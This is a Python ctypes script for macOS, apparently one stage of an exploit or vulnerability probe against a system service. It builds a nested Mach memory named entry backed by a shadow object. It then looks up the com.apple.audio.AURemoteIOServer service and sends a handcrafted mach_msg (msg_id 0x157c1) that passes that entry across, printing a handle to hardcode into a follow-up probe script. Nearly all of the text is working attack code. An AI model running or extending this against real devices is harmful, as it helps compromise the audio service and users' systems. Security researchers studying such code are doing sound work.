import ctypes as C, struct

# Run this when memory < 1250 MB. Output nc_hndl, then run surface_c_probe_b.py.

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32
t = L.mach_task_self()

# === Stage 1: Shadow named entry ===
M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int, C.POINTER(C.c_uint32), C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64, C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]

a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
print(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0: raise SystemExit(1)

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
print(f"parent_ne kr={kr}")
if kr != 0: raise SystemExit(1)

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
print(f"child_ne kr={kr}")
if kr != 0: raise SystemExit(1)

m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
print(f"map_child kr={kr} va={hex(m.value)}")
if kr != 0: raise SystemExit(1)

q = (C.c_uint8 * 0x4000).from_address(m.value)
q[0x3000] = 0xAB

ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(ne), 0)
print(f"shadow_ne kr={kr} ne={ne.value}")
if kr != 0: raise SystemExit(1)

# === Stage 2: AURemoteIOServer lookup ===
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32.in_dll(L, "bootstrap_port").value
print(f"bootstrap_port={bs}")
svc = C.c_uint32(0)
kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: raise SystemExit(1)

rp = L.mach_reply_port()
print(f"reply_port={rp}")

COMPLEX  = 0x80000000
SO_BITS  = (0x14 << 8) | 0x13
CS_BITS  = COMPLEX | SO_BITS

# === Stage 3: NewClient (msg_id 0x157c1) ===
buf = bytearray(0x200)
struct.pack_into('<IIIIII', buf, 0x00,
    CS_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
struct.pack_into('<I', buf, 0x18, 1)
struct.pack_into('<IIHBB', buf, 0x1c,
    ne.value, 0, 0, 17, 0)   # MOVE_SEND our shadow ne

buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
kr = L.mach_msg(buf_c, 3, 0x3c, len(buf), rp, 0, 0)
print(f"NewClient mach_msg kr={kr:#010x}")
if kr != 0: raise SystemExit(1)

nc_bits = struct.unpack_from('<I', buf, 0)[0]
nc_size = struct.unpack_from('<I', buf, 4)[0]
nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
print(f"  reply: bits={nc_bits:#x} size={nc_size} ret={nc_ret:#010x} handle={nc_hndl:#x}")
if nc_ret != 0: raise SystemExit(1)

print(f"\n>>> nc_hndl = {nc_hndl:#x}  (hardcode this in surface_c_probe_b.py) <<<\n")
